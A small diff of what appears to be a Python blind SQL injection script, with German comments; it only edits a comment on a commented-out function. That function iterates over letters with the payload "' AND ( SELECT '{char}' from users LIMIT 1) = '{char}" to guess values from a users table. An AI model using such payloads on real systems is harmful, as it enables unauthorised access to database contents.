@@ -12,7 +12,8 @@ def fire_payload(cookies, url):
         return True
 
 
-# Geht gerade nicht wegen pw_length problem.
+# Geht gerade nicht
+# warte auf lösung für Cookie-Verdopplung
 # def username(cookies, url):
 #    for char in string.ascii_lowercase:
 #        payload = f"' AND ( SELECT '{char}' from users LIMIT 1) = '{char}"
